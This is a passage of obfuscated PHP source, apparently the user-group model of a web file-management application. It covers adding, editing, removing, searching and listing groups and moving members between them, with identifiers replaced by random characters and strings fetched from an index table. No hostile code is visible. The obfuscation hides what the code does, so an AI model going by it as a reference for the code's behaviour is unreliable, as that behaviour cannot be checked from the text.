$ïÈˆû½[1895] => $™ûÍ¾—ğ[$ïÈˆû½[1799]], $ïÈˆû½[1896] => 0, $ïÈˆû½[1816] => 0); if (isset($™ûÍ¾—ğ[$ïÈˆû½[1835]])) { $ÅÆÙ™±[$ïÈˆû½[1835]] = $™ûÍ¾—ğ[$ïÈˆû½[1835]]; } else { $ù”úÕ = $this->max($ïÈˆû½[1835]); if (!$ù”úÕ) { $ù”úÕ = 0; } $ÅÆÙ™±[$ïÈˆû½[1835]] = $ù”úÕ + 1; } if (!empty($™ûÍ¾—ğ[$ïÈˆû½[1812]])) { $ÅÆÙ™±[$ïÈˆû½[1812]] = $™ûÍ¾—ğ[$ïÈˆû½[1812]]; } $÷ĞíóÏŠ = $this->add($ÅÆÙ™±); $this->setNamePinyin($÷ĞíóÏŠ, $ÅÆÙ™±[$ïÈˆû½[32]]); if (isset($™ûÍ¾—ğ[$ïÈˆû½[1897]])) { $this->metaSet($÷ĞíóÏŠ, array($ïÈˆû½[1897] => $™ûÍ¾—ğ[$ïÈˆû½[1897]], $ïÈˆû½[1898] => $™ûÍ¾—ğ[$ïÈˆû½[1898]])); unset($™ûÍ¾—ğ[$ïÈˆû½[1897]]); unset($™ûÍ¾—ğ[$ïÈˆû½[1898]]); } Model($ïÈˆû½[1316])->groupRootAdd($÷ĞíóÏŠ); return $÷ĞíóÏŠ; } protected function groupEdit($š¨¦œ“ñ, $åòş”¤î) { $ ‡ˆ¬È =& $_SERVER[Æ š¦İÈ]; $üÊ½ÀÜˆ = $this->getInfoSimple($š¨¦œ“ñ); if (!$üÊ½ÀÜˆ) { return !1; } if (!empty($åòş”¤î[$ ‡ˆ¬È[500]])) { $†ŞÛß´ = $this->getInfoSimple($åòş”¤î[$ ‡ˆ¬È[500]]); if (!$†ŞÛß´) { return !1; } if ($üÊ½ÀÜˆ[$ ‡ˆ¬È[1812]] == $†ŞÛß´[$ ‡ˆ¬È[1812]]) { return !1; } if ($åòş”¤î[$ ‡ˆ¬È[500]] != $üÊ½ÀÜˆ[$ ‡ˆ¬È[500]]) { if ($†ŞÛß´[$ ‡ˆ¬È[523]] !== $üÊ½ÀÜˆ[$ ‡ˆ¬È[523]] && strpos($†ŞÛß´[$ ‡ˆ¬È[523]], $üÊ½ÀÜˆ[$ ‡ˆ¬È[523]] . $üÊ½ÀÜˆ[$ ‡ˆ¬È[1812]] . $ ‡ˆ¬È[50]) === 0) { return !1; } $åòş”¤î[$ ‡ˆ¬È[586]] = $†ŞÛß´[$ ‡ˆ¬È[523]] . $åòş”¤î[$ ‡ˆ¬È[500]] . $ ‡ˆ¬È[50]; $this->_changeChildLevel($üÊ½ÀÜˆ, $†ŞÛß´); } } if (isset($åòş”¤î[$ ‡ˆ¬È[32]])) { $this->setNamePinyin($š¨¦œ“ñ, $åòş”¤î[$ ‡ˆ¬È[32]]); } if (isset($åòş”¤î[$ ‡ˆ¬È[1897]])) { $this->metaSet($š¨¦œ“ñ, array($ ‡ˆ¬È[1897] => $åòş”¤î[$ ‡ˆ¬È[1897]], $ ‡ˆ¬È[1898] => $åòş”¤î[$ ‡ˆ¬È[1898]])); unset($åòş”¤î[$ ‡ˆ¬È[1897]]); unset($åòş”¤î[$ ‡ˆ¬È[1898]]); } $this->_clearChildrenCache($üÊ½ÀÜˆ); return $this->where(array($ ‡ˆ¬È[1899] => $š¨¦œ“ñ))->save($åòş”¤î); } private function _clearChildrenCache($¨¬Œ³¨Á) { $û¾ŸØäĞ =& $_SERVER[Æ š¦İÈ]; $Ì–­ºÒí = array($û¾ŸØäĞ[586] => array($û¾ŸØäĞ[546], $¨¬Œ³¨Á[$û¾ŸØäĞ[523]] . $¨¬Œ³¨Á[$û¾ŸØäĞ[1812]] . $û¾ŸØäĞ[547])); $„‰âù€ã = $this->field($û¾ŸØäĞ[1812])->where($Ì–­ºÒí)->select(); foreach ($„‰âù€ã as $Ú Ñİû) { $this->_clearCache($Ú Ñİû[$û¾ŸØäĞ[1812]]); } } private function _clearCache($Ñ¥³İÄâ) { $¡öÂŞÎ¬ =& $_SERVER[Æ š¦İÈ]; $this->cacheFunctionClear($¡öÂŞÎ¬[1893], $Ñ¥³İÄâ); $this->cacheFunctionClear($¡öÂŞÎ¬[1894], $Ñ¥³İÄâ); } private function _changeChildLevel($ÓİŞ³éÂ, $ÎäÌŒ°§, $¶ö¦ªÉá = false) { $Æ½òıº =& $_SERVER[Æ š¦İÈ]; $ ½üŒ­¶ = $ÓİŞ³éÂ[$Æ½òıº[523]] . $ÓİŞ³éÂ[$Æ½òıº[1812]] . $Æ½òıº[50]; $•Ò×Œ‡á = $ÎäÌŒ°§[$Æ½òıº[523]] . $ÎäÌŒ°§[$Æ½òıº[1812]] . $Æ½òıº[50] . $ÓİŞ³éÂ[$Æ½òıº[1812]] . $Æ½òıº[50]; if ($¶ö¦ªÉá) { $•Ò×Œ‡á = $ÎäÌŒ°§[$Æ½òıº[523]] . $ÎäÌŒ°§[$Æ½òıº[1812]] . $Æ½òıº[50]; } $‡ ¤ıüº = array($Æ½òıº[586] => array($Æ½òıº[546], $ÓİŞ³éÂ[$Æ½òıº[523]] . $ÓİŞ³éÂ[$Æ½òıº[1812]] . $Æ½òıº[547])); $Ó€À˜ö = array($Æ½òıº[586] => array($Æ½òıº[595], "\x72\145\x70\x6c\x61\143\145\x28\x70\x61\x72\145\x6e\x74\114\x65\x76\x65\x6c\54\47{$ ½üŒ­¶}\47\54\47{$•Ò×Œ‡á}\x27\x29")); $this->_clearChildrenCache($ÓİŞ³éÂ); $this->where($‡ ¤ıüº)->data($Ó€À˜ö)->save(); } public function setNamePinyin($ëºË¯ş¢, $Øàô®š = false) { $‡ÍŸô¡ =& $_SERVER[Æ š¦İÈ]; if (!$Øàô®š) { $Ñ¯›‚õı = $this->getInfoSimple($ëºË¯ş¢); $Øàô®š = $Ñ¯›‚õı[$‡ÍŸô¡[32]]; } if (!Input::check($Øàô®š, $‡ÍŸô¡[589])) { $this->metaSet($ëºË¯ş¢, $‡ÍŸô¡[466], null); $this->metaSet($ëºË¯ş¢, $‡ÍŸô¡[465], null); return; } $Ş‡Ä°ƒç = array($‡ÍŸô¡[466] => str_replace($‡ÍŸô¡[53], $‡ÍŸô¡[12], Pinyin::get($Øàô®š)), $‡ÍŸô¡[465] => Pinyin::get($Øàô®š, $‡ÍŸô¡[590])); $this->metaSet($ëºË¯ş¢, $Ş‡Ä°ƒç); } protected function groupStatus($ëô‰‚¹Ü, $²ĞÂ±ş) { $òó¹‰”Û =& $_SERVER[Æ š¦İÈ]; $Ï«‡÷Íù = $this->getInfoSimple($ëô‰‚¹Ü); if (!$Ï«‡÷Íù) { return !1; } if ($²ĞÂ±ş == $òó¹‰”Û[89]) { $µÌö·ß = $this->parentLevelArray($Ï«‡÷Íù[$òó¹‰”Û[523]]); } else { $œÓß‹ı = array($òó¹‰”Û[586] => array($òó¹‰”Û[546], $Ï«‡÷Íù[$òó¹‰”Û[523]] . $Ï«‡÷Íù[$òó¹‰”Û[1812]] . $òó¹‰”Û[547])); $µÌö·ß = $this->where($œÓß‹ı)->field($òó¹‰”Û[1812])->select(); $µÌö·ß = array_to_keyvalue($µÌö·ß, $òó¹‰”Û[12], $òó¹‰”Û[1812]); } $µÌö·ß[] = $Ï«‡÷Íù[$òó¹‰”Û[1812]]; $ì•ÇÜä… = array(); foreach ($µÌö·ß as $ëô‰‚¹Ü) { $ì•ÇÜä…[] = array($òó¹‰”Û[1812] => $ëô‰‚¹Ü, $òó¹‰”Û[95] => $òó¹‰”Û[747], $òó¹‰”Û[371] => $²ĞÂ±ş); $this->_clearCache($ëô‰‚¹Ü); } return Model($òó¹‰”Û[1900])->addAll($ì•ÇÜä…, array(), !0); } protected function groupRemove($½÷ Êô) { $ŒÊ€Œ¥Ğ =& $_SERVER[Æ š¦İÈ]; $ÊƒêÀ÷İ = array($ŒÊ€Œ¥Ğ[1812] => $½÷ Êô); $øïƒ¶çœ = $this->where($ÊƒêÀ÷İ)->find(); if (!$øïƒ¶çœ || $øïƒ¶çœ[$ŒÊ€Œ¥Ğ[500]] == 0) { return !1; } $—«ôœ¨œ = $this->getInfoSimple($øïƒ¶çœ[$ŒÊ€Œ¥Ğ[500]]); $this->_changeChildLevel($øïƒ¶çœ, $—«ôœ¨œ, !0); $this->where(array($ŒÊ€Œ¥Ğ[500] => $½÷ Êô))->save(array($ŒÊ€Œ¥Ğ[500] => $øïƒ¶çœ[$ŒÊ€Œ¥Ğ[500]])); Model($ŒÊ€Œ¥Ğ[1900])->where($ÊƒêÀ÷İ)->delete(); Model($ŒÊ€Œ¥Ğ[1901])->where($ÊƒêÀ÷İ)->delete(); Model($ŒÊ€Œ¥Ğ[822])->groupRootRemove($½÷ Êô); return $this->where($ÊƒêÀ÷İ)->delete(); } protected function groupSort($ÛÜñºıÕ) { $§ü¨Üî¢ =& $_SERVER[Æ š¦İÈ]; $çôèº— = array(); foreach ($ÛÜñºıÕ as $Ñ†ÎŒÍ‰ => $Ûå·Æ¡) { $çôèº—[] = array($§ü¨Üî¢[1812], $Ûå·Æ¡, $§ü¨Üî¢[1835], $Ñ†ÎŒÍ‰ + 1); } $this->saveAll($çôèº—); } public function listData() { $¸ïÖ’ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¸ïÖ’[$_SERVER[Æ š¦İÈ][366]]); return $¸ïÖ’; } private function _makeOrder($‚æ®Ö’¼ = '') { $óÆ˜×Êİ =& $_SERVER[Æ š¦İÈ]; $ùÛœ¸İ­ = array($óÆ˜×Êİ[1812], $óÆ˜×Êİ[32], $óÆ˜×Êİ[1801], $óÆ˜×Êİ[195]); $µ‘İ²ø¹ = array($óÆ˜×Êİ[450] => $óÆ˜×Êİ[451], $óÆ˜×Êİ[452] => $óÆ˜×Êİ[453]); $æş¬‚°î = Input::get($óÆ˜×Êİ[457], $óÆ˜×Êİ[7], $óÆ˜×Êİ[1816], $ùÛœ¸İ­); $åŒ“¸®³ = Input::get($óÆ˜×Êİ[458], $óÆ˜×Êİ[7], $óÆ˜×Êİ[1902], array($óÆ˜×Êİ[1902], $óÆ˜×Êİ[452])); $åŒ“¸®³ = $µ‘İ²ø¹[$åŒ“¸®³]; $‚æ®Ö’¼ = $‚æ®Ö’¼ . "{$æş¬‚°î}\x20{$åŒ“¸®³}\54\40\147\x72\x6f\x75\x70\x49\x44\x20\141\x73\143"; return $this->order($‚æ®Ö’¼); } public function listChild($ÅÁÁµØ‚) { $şƒ’êØâ =& $_SERVER[Æ š¦İÈ]; $„–³ıõë = $this->where(array($şƒ’êØâ[500] => $ÅÁÁµØ‚))->_makeOrder()->selectPage(200); $this->_listDataApply($„–³ıõë[$şƒ’êØâ[366]]); return $„–³ıõë; } public function listByID($¾×¬ºïƒ) { $±¸ÜœÃ =& $_SERVER[Æ š¦İÈ]; if (!$¾×¬ºïƒ) { return array(); } $µÔ§»Í˜ = array($±¸ÜœÃ[1812] => array($±¸ÜœÃ[7], $¾×¬ºïƒ)); $ß•€Ğ«¦ = $this->where($µÔ§»Í˜)->select(); $ß•€Ğ«¦ = array_sort_keep($ß•€Ğ«¦, $±¸ÜœÃ[1812], $¾×¬ºïƒ); $this->_listDataApply($ß•€Ğ«¦); return $ß•€Ğ«¦; } public function listSearch($Åãœúû¾) { $ĞĞòÁÛ£ =& $_SERVER[Æ š¦İÈ]; $³Ê¿Ñ¿é = $Åãœúû¾[$ĞĞòÁÛ£[1903]]; $¥ Ìî¡ñ = isset($Åãœúû¾[$ĞĞòÁÛ£[1904]]) ? $Åãœúû¾[$ĞĞòÁÛ£[1904]] : !1; if (!trim($³Ê¿Ñ¿é)) { return !1; } $³Ê¿Ñ¿é = str_replace($ĞĞòÁÛ£[1905], $ĞĞòÁÛ£[1906], $³Ê¿Ñ¿é); $şèåÓˆê = array($ĞĞòÁÛ£[1812] => array($ĞĞòÁÛ£[380], "{$³Ê¿Ñ¿é}\x25"), $ĞĞòÁÛ£[32] => array($ĞĞòÁÛ£[380], "\45{$³Ê¿Ñ¿é}\x25"), $ĞĞòÁÛ£[991] => $ĞĞòÁÛ£[1907]); if ($¥ Ìî¡ñ) { $¹é§„¸ã = $this->getInfoSimple($¥ Ìî¡ñ); $­Ëù¥§ê = $¹é§„¸ã[$ĞĞòÁÛ£[523]] . $¥ Ìî¡ñ . $ĞĞòÁÛ£[547]; $şèåÓˆê = array($şèåÓˆê, array($ĞĞòÁÛ£[523] => array($ĞĞòÁÛ£[380], $­Ëù¥§ê))); } $şèåÓˆê = $this->parseWhereLike($şèåÓˆê); $’·Ó™› = $this->_makeOrder()->where($şèåÓˆê)->selectPage(20); $’·Ó™› = $’·Ó™› ? $’·Ó™› : array($ĞĞòÁÛ£[366] => array(), $ĞĞòÁÛ£[363] => array()); if (!$’·Ó™› || count($’·Ó™›[$ĞĞòÁÛ£[366]]) < 5 && Input::check($³Ê¿Ñ¿é, $ĞĞòÁÛ£[315])) { $§Ø¨›‹¦ = $this->groupChildrenAll($¥ Ìî¡ñ); $ÒÊå€¡û = $this->_searchFromMeta($ĞĞòÁÛ£[465], $³Ê¿Ñ¿é, 10, $§Ø¨›‹¦); $ÁÇãü = $this->_searchFromMeta($ĞĞòÁÛ£[466], $³Ê¿Ñ¿é, 10, $§Ø¨›‹¦); $â°£¦Ñ÷ = array_merge($ÒÊå€¡û, $ÁÇãü, $’·Ó™›[$ĞĞòÁÛ£[366]]); $’·Ó™›[$ĞĞòÁÛ£[366]] = array_unique_by_key($â°£¦Ñ÷, $ĞĞòÁÛ£[1812]); $’·Ó™›[$ĞĞòÁÛ£[363]][$ĞĞòÁÛ£[364]] = count($’·Ó™›[$ĞĞòÁÛ£[366]]); $’·Ó™›[$ĞĞòÁÛ£[363]][$ĞĞòÁÛ£[365]] = ceil($’·Ó™›[$ĞĞòÁÛ£[363]][$ĞĞòÁÛ£[364]] / $’·Ó™›[$ĞĞòÁÛ£[363]][$ĞĞòÁÛ£[360]]); } $this->_listDataApply($’·Ó™›[$ĞĞòÁÛ£[366]]); return $’·Ó™›; } protected function groupChildrenAll($ú £Î’) { $ÉæÌó» =& $_SERVER[Æ š¦İÈ]; if (!$ú £Î’) { return !1; } if (is_string($ú £Î’)) { $ú £Î’ = array($ú £Î’); } $õÉÎ‹¦¬ = $ú £Î’; foreach ($ú £Î’ as $è½‚‘Ë) { $üô–÷û = $this->getInfoSimple($è½‚‘Ë); $çŒ‚–Ÿ§ = array($ÉæÌó»[523] => array($ÉæÌó»[380], $üô–÷û[$ÉæÌó»[523]] . $è½‚‘Ë . $ÉæÌó»[547])); $èƒ›‡ú = $this->field($ÉæÌó»[1812])->where($çŒ‚–Ÿ§)->select(); $õÉÎ‹¦¬ = array_merge($õÉÎ‹¦¬, array_to_keyvalue($èƒ›‡ú, $ÉæÌó»[12], $ÉæÌó»[1812])); } return array_unique($õÉÎ‹¦¬); } private function _searchFromMeta($ÎêÈ€Éë, $†£úŠÊ, $û¨¹Ú¼Ü, $öø×Ê³Ñ) { $‘»èããí =& $_SERVER[Æ š¦İÈ]; $†£úŠÊ = strtolower($†£úŠÊ); $Üæ¨”õ‡ = array($‘»èããí[95] => $ÎêÈ€Éë, $‘»èããí[371] => array($‘»èããí[380], "\45{$†£úŠÊ}\45")); $Üæ¨”õ‡ = $this->parseWhereLike($Üæ¨”õ‡); if ($öø×Ê³Ñ) { $Üæ¨”õ‡[$‘»èããí[1812]] = array($‘»èããí[7], $öø×Ê³Ñ); } $ñ‰ŞÕûş = Model($‘»èããí[1908])->where($Üæ¨”õ‡)->limit($û¨¹Ú¼Ü)->select(); if (!$ñ‰ŞÕûş) { return array(); } $ñ‰ŞÕûş = array_to_keyvalue($ñ‰ŞÕûş, $‘»èããí[12], $‘»èããí[1812]); $¼Ô†Œü¯ = $this->where(array($‘»èããí[1899] => array($‘»èããí[7], $ñ‰ŞÕûş)))->select(); if (!$¼Ô†Œü¯) { return array(); } return $¼Ô†Œü¯; } protected function _listDataApplyItem($ïÕë²÷å) { $éÏÛÒßó = array($ïÕë²÷å); $this->_listDataApply($éÏÛÒßó); return $éÏÛÒßó[0]; } protected function _listDataApply(&$¨Ä—Â¬ä) { $½‚Ú™ßñ =& $_SERVER[Æ š¦İÈ]; if (!$¨Ä—Â¬ä) { return; } $İºÊ«ã = array_to_keyvalue($¨Ä—Â¬ä, $½‚Ú™ßñ[12], $½‚Ú™ßñ[1812]); $this->_listAppendChildren($¨Ä—Â¬ä); $this->_listAppendChildrenMember($¨Ä—Â¬ä); $this->_listAppendMeta($¨Ä—Â¬ä, $İºÊ«ã); $this->_listAppendParent($¨Ä—Â¬ä); $this->_listAppendSourceRoot($¨Ä—Â¬ä, $İºÊ«ã); } private function _listAppendChildren(&$œ‰¿¸³Ã) { $ƒ˜Å÷ÓÇ =& $_SERVER[Æ š¦İÈ]; $±ë™³ø¬ = array_to_keyvalue($œ‰¿¸³Ã, $ƒ˜Å÷ÓÇ[12], $ƒ˜Å÷ÓÇ[1812]); $´ğ ùæ = array($ƒ˜Å÷ÓÇ[500] => array($ƒ˜Å÷ÓÇ[7], $±ë™³ø¬)); $†Ğ¶á¿ = array($ƒ˜Å÷ÓÇ[500], $ƒ˜Å÷ÓÇ[1909] => $ƒ˜Å÷ÓÇ[502]); $ìÄˆ«¶È = $this->field($†Ğ¶á¿)->where($´ğ ùæ)->group($ƒ˜Å÷ÓÇ[500])->select(); $À‘°³ÜÆ = array_to_keyvalue($ìÄˆ«¶È, $ƒ˜Å÷ÓÇ[500], $ƒ˜Å÷ÓÇ[502]); foreach ($œ‰¿¸³Ã as &$‘¦éèŞ) { $ş©´ªã¡ = $‘¦éèŞ[$ƒ˜Å÷ÓÇ[1812]]; $‘¦éèŞ[$ƒ˜Å÷ÓÇ[1910]] = isset($À‘°³ÜÆ[$ş©´ªã¡]) ? intval($À‘°³ÜÆ[$ş©´ªã¡]) : !1; } unset($‘¦éèŞ); } private function _listAppendChildrenMember(&$†÷“—¬ë) { $€Ì»™âË =& $_SERVER[Æ š¦İÈ]; $÷ì¡´—ê = array_to_keyvalue($†÷“—¬ë, $€Ì»™âË[12], $€Ì»™âË[1812]); $®ÂâÓ…½ = array($€Ì»™âË[1812] => array($€Ì»™âË[7], $÷ì¡´—ê)); $ª„‹õğÏ = array($€Ì»™âË[1812], $€Ì»™âË[1909] => $€Ì»™âË[502]); $–¬˜¦¨Ş = Model($€Ì»™âË[1901])->field($ª„‹õğÏ)->where($®ÂâÓ…½)->group($€Ì»™âË[1812])->select(); $÷´½õƒ™ = array_to_keyvalue($–¬˜¦¨Ş, $€Ì»™âË[1812], $€Ì»™âË[502]); foreach ($†÷“—¬ë as &$ÏÆÃğÙé) { $Ïä©£¼Í = $ÏÆÃğÙé[$€Ì»™âË[1812]]; $ÏÆÃğÙé[$€Ì»™âË[1911]] = isset($÷´½õƒ™[$Ïä©£¼Í]) ? intval($÷´½õƒ™[$Ïä©£¼Í]) : !1; } unset($ÏÆÃğÙé); } private function _listAppendMeta(&$óÁÏ†­ , $ÁÚÆşÄ”) { $şæÍÑåæ =& $_SERVER[Æ š¦İÈ]; $­ºš¶‰ = array($şæÍÑåæ[1812] => array($şæÍÑåæ[7], $ÁÚÆşÄ”)); $ªùÜ¿»Õ = Model($şæÍÑåæ[1900])->where($­ºš¶‰)->select(); $ªùÜ¿»Õ = array_to_keyvalue_group($ªùÜ¿»Õ, $şæÍÑåæ[1812]); foreach ($ªùÜ¿»Õ as &$ú’Ÿ¶‰ê) { $ú’Ÿ¶‰ê = array_to_keyvalue($ú’Ÿ¶‰ê, $şæÍÑåæ[95], $şæÍÑåæ[371]); } unset($ú’Ÿ¶‰ê); foreach ($óÁÏ†­  as &$µö¯Ïú) { $µö¯Ïú[$şæÍÑåæ[467]] = array(); if (isset($ªùÜ¿»Õ[$µö¯Ïú[$şæÍÑåæ[1812]]])) { $µö¯Ïú[$şæÍÑåæ[467]] = $ªùÜ¿»Õ[$µö¯Ïú[$şæÍÑåæ[1812]]]; } } unset($µö¯Ïú); } protected function parentLevelArray($¸±°ÑÀè) { $«Á÷â± =& $_SERVER[Æ š¦İÈ]; $¸±°ÑÀè = explode($«Á÷â±[50], trim($¸±°ÑÀè, $«Á÷â±[50])); $¸±°ÑÀè = array_remove_value($¸±°ÑÀè, $«Á÷â±[192]); return $¸±°ÑÀè; } private function _listAppendParent(&$‰šÅñ¶«) { $š“‡úßÛ =& $_SERVER[Æ š¦İÈ]; $º³†¨äŸ = array(); foreach ($‰šÅñ¶« as &$Ê¾†Ñ¥Â) { $º³†¨äŸ[$Ê¾†Ñ¥Â[$š“‡úßÛ[1812]]] = $Ê¾†Ñ¥Â[$š“‡úßÛ[32]]; $ƒÜ´Œ³ï = $this->parentLevelArray($Ê¾†Ñ¥Â[$š“‡úßÛ[523]]); foreach ($ƒÜ´Œ³ï as $ø›¡Îœ•) { if (!isset($º³†¨äŸ[$ø›¡Îœ•])) { $º³†¨äŸ[$ø›¡Îœ•] = 0; } } } unset($Ê¾†Ñ¥Â); foreach ($º³†¨äŸ as $Íš«²ªÖ => $½ûèÎİ›) { if ($½ûèÎİ›) { continue; } $Ô„—Ø£ = $this->getInfoSimple($Íš«²ªÖ); $º³†¨äŸ[$Íš«²ªÖ] = $Ô„—Ø£[$š“‡úßÛ[32]]; } $—¶©³Ñ = $GLOBALS[$š“‡úßÛ[6]][$š“‡úßÛ[90]][$š“‡úßÛ[1912]]; if ($GLOBALS[$š“‡úßÛ[507]] == $š“‡úßÛ[89]) { $—¶©³Ñ = !1; } foreach ($‰šÅñ¶« as &$Ê¾†Ñ¥Â) { $ƒÜ´Œ³ï = $this->parentLevelArray($Ê¾†Ñ¥Â[$š“‡úßÛ[523]]); $­ãİí‡ = $š“‡úßÛ[12]; foreach ($ƒÜ´Œ³ï as $Íš«²ªÖ => $ø›¡Îœ•) { if ($—¶©³Ñ && $Íš«²ªÖ == 0) { continue; } $­ãİí‡ .= $º³†¨äŸ[$ø›¡Îœ•] . $š“‡úßÛ[8]; } if ($ƒÜ´Œ³ï) { $­ãİí‡ .= $Ê¾†Ñ¥Â[$š“‡úßÛ[32]]; } $Ê¾†Ñ¥Â[$š“‡úßÛ[528]] = str_replace($š“‡úßÛ[531], $š“‡úßÛ[8], $­ãİí‡); } unset($Ê¾†Ñ¥Â); } private function _listAppendSourceRoot(&$¥Ùù¿”À, $‚æÖ©—Á) { $ßÛ¨œäö =& $_SERVER[Æ š¦İÈ]; $Ä‡÷¨”” = Model($ßÛ¨œäö[822])->listSourceRoot(SourceModel::TYPE_GROUP, $‚æÖ©—Á); $Ä‡÷¨”” = array_to_keyvalue($Ä‡÷¨””, $ßÛ¨œäö[506]); $Ä‡÷¨”” = array_remove_key($Ä‡÷¨””, $ßÛ¨œäö[506]); foreach ($¥Ùù¿”À as &$ï´ÁŒö¡) { $ï´ÁŒö¡[$ßÛ¨œäö[87]] = $Ä‡÷¨””[$ï´ÁŒö¡[$ßÛ¨œäö[1812]]] ? $Ä‡÷¨””[$ï´ÁŒö¡[$ßÛ¨œäö[1812]]] : array(); } unset($ï´ÁŒö¡); } protected function groupMerge($İûßùì) { $İûßùì = array_values(array_unique($İûßùì)); $ªã½¯¯× = array(); for ($°ìéæ£™ = 0; $°ìéæ£™ < count($İûßùì); $°ìéæ£™++) { $ÜËµçÂî = !1; for ($ïğ‚´Ã = 0; $ïğ‚´Ã < count($İûßùì); $ïğ‚´Ã++) { if ($°ìéæ£™ == $ïğ‚´Ã) { continue; } if ($this->isParentOf($İûßùì[$ïğ‚´Ã], $İûßùì[$°ìéæ£™])) { $ÜËµçÂî = !0; break; } } if (!$ÜËµçÂî) { $ªã½¯¯×[] = $İûßùì[$°ìéæ£™]; } } return $ªã½¯¯×; } protected function isParentOf($î¢¤”­‹, $Ô³¢Â‰) { $™³¡¥Ó÷ =& $_SERVER[Æ š¦İÈ]; if (!$î¢¤”­‹ || !$Ô³¢Â‰ || $î¢¤”­‹ == $Ô³¢Â‰) { return !1; } $ÎíãµÕ³ = $this->getInfoSimple($î¢¤”­‹); $·ìøÉšÅ = $this->getInfoSimple($Ô³¢Â‰); $¥äã´—ˆ = $ÎíãµÕ³[$™³¡¥Ó÷[523]] . $î¢¤”­‹ . $™³¡¥Ó÷[50]; if (substr($·ìøÉšÅ[$™³¡¥Ó÷[523]], 0, strlen($¥äã´—ˆ)) == $¥äã´—ˆ) { return !0; } return !1; } public function groupShowRoot($ŠËƒáûã, $É­‘‹©Õ = false) { $©‡ŸÖ† =& $_SERVER[Æ š¦İÈ]; $Ø¹ĞÚ = $this->getInfo($ŠËƒáûã); if (!$Ø¹ĞÚ) { return array(); } $Ô¶ÙÇÍ‰ = $this->parentLevelArray($Ø¹ĞÚ[$©‡ŸÖ†[523]]); $ƒú·ˆË‘ = array($ŠËƒáûã); if (count($Ô¶ÙÇÍ‰) == 0) { return $ƒú·ˆË‘; } if ($É­‘‹©Õ && count($Ô¶ÙÇÍ‰) == 1) { return $ƒú·ˆË‘; } if (!$Ø¹ĞÚ[$©‡ŸÖ†[467]] || !isset($Ø¹ĞÚ[$©‡ŸÖ†[467]][$©‡ŸÖ†[1897]]) || $Ø¹ĞÚ[$©‡ŸÖ†[467]][$©‡ŸÖ†[1897]] == $©‡ŸÖ†[1866]) { return $this->groupShowRoot($Ô¶ÙÇÍ‰[count($Ô¶ÙÇÍ‰) - 1], $É­‘‹©Õ); } if ($Ø¹ĞÚ[$©‡ŸÖ†[467]][$©‡ŸÖ†[1897]] == $©‡ŸÖ†[354]) { $àŒË­ì = explode($©‡ŸÖ†[50], $Ø¹ĞÚ[$©‡ŸÖ†[467]][$©‡ŸÖ†[1898]]); if ($àŒË­ì) { $ƒú·ˆË‘ = array_merge($ƒú·ˆË‘, $àŒË­ì); } } return $ƒú·ˆË‘; } protected function resetParentLevel() { $Š›ë¿Šë =& $_SERVER[Æ š¦İÈ]; $˜¹ş¦Ù = $Š›ë¿Šë[1812]; $ôÉµ¬ã = $this->select(); $ôÉµ¬ã = array_to_keyvalue($ôÉµ¬ã, $˜¹ş¦Ù); foreach ($ôÉµ¬ã as $ŒÃ”ç¸) { $Ô¹öË = $ŒÃ”ç¸; $Íüö¢ß = array(); while ($Ô¹öË[$Š›ë¿Šë[500]] != 0) { $Íüö¢ß[] = $Ô¹öË[$Š›ë¿Šë[500]]; $Ô¹öË = $ôÉµ¬ã[$Ô¹öË[$Š›ë¿Šë[500]]]; } $Íüö¢ß[] = 0; $Íüö¢ß = $Š›ë¿Šë[50] . implode($Š›ë¿Šë[50], array_reverse($Íüö¢ß)) . $Š›ë¿Šë[50]; $this->setNamePinyin($ŒÃ”ç¸[$˜¹ş¦Ù], $ŒÃ”ç¸[$Š›ë¿Šë[32]]); $this->where(array($˜¹ş¦Ù => $ŒÃ”ç¸[$˜¹ş¦Ù]))->save(array($Š›ë¿Šë[586] => $Íüö¢ß)); } return $ôÉµ¬ã; } public function groupNameAuto($¶Ø‡³ª›, $ç«ñºäí) { $â¸²ºŸ¬ =& $_SERVER[Æ š¦İÈ]; $…ÍĞ¼° = $this->where(array($â¸²ºŸ¬[404] => $¶Ø‡³ª›))->getField($â¸²ºŸ¬[32], !0); if (!$…ÍĞ¼° || !in_array($ç«ñºäí, $…ÍĞ¼°)) { return $ç«ñºäí; } for ($¡ôîÙİ = 1; $¡ôîÙİ <= count($…ÍĞ¼°) + 1; $¡ôîÙİ++) { $ŒÚ–­—· = $ç«ñºäí . "\50{$¡ôîÙİ}\51"; if (!in_array($ŒÚ–­—·, $…ÍĞ¼°)) { return $ŒÚ–­—·; } } } public function groupSwitch($’‹­å‰ß, $¿·ˆ…¬) { $ÔºÍ¼”Ç =& $_SERVER[Æ š¦İÈ]; $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[1812] => array($ÔºÍ¼”Ç[7], array($’‹­å‰ß, $¿·ˆ…¬))); $ôÚ¶šÁğ = $this->where($áÜ¶‰ºÔ)->select(); $ôÚ¶šÁğ = array_to_keyvalue($ôÚ¶šÁğ, $ÔºÍ¼”Ç[1812]); if (!isset($ôÚ¶šÁğ[$’‹­å‰ß]) || !isset($ôÚ¶šÁğ[$¿·ˆ…¬]) || $ôÚ¶šÁğ[$’‹­å‰ß][$ÔºÍ¼”Ç[500]] == 0) { return !1; } $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[1812] => $’‹­å‰ß); $Åß¹ § = Model($ÔºÍ¼”Ç[1901])->where($áÜ¶‰ºÔ)->select(); if (!$Åß¹ §) { $Åß¹ § = array(); } foreach ($Åß¹ § as $ºß¸†Å) { $ó¥Í¬èµ = $ºß¸†Å[$ÔºÍ¼”Ç[1644]]; $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[1644] => $ó¥Í¬èµ, $ÔºÍ¼”Ç[1812] => $¿·ˆ…¬); $ÏšÍ‡Â = Model($ÔºÍ¼”Ç[1901])->where($áÜ¶‰ºÔ)->find(); if (!$ÏšÍ‡Â) { $‡¥¯ƒÎÚ = array($¿·ˆ…¬ => $ºß¸†Å[$ÔºÍ¼”Ç[1913]]); Model($ÔºÍ¼”Ç[540])->userGroupAdd($ó¥Í¬èµ, $‡¥¯ƒÎÚ); } Model($ÔºÍ¼”Ç[540])->userGroupRemove($ó¥Í¬èµ, $’‹­å‰ß); } $áÜ¶‰ºÔ = array($ÔºÍ¼”Ç[414] => 2, $ÔºÍ¼”Ç[500] => 0, $ÔºÍ¼”Ç[413] => 1, $ÔºÍ¼”Ç[506] => array($ÔºÍ¼”Ç[7], array($’‹­å‰ß, $¿·ˆ…¬))); $ÌÎØ’¡¤ = Model($ÔºÍ¼”Ç[822])->where($áÜ¶‰ºÔ)->field($ÔºÍ¼”Ç[1914])->select(); 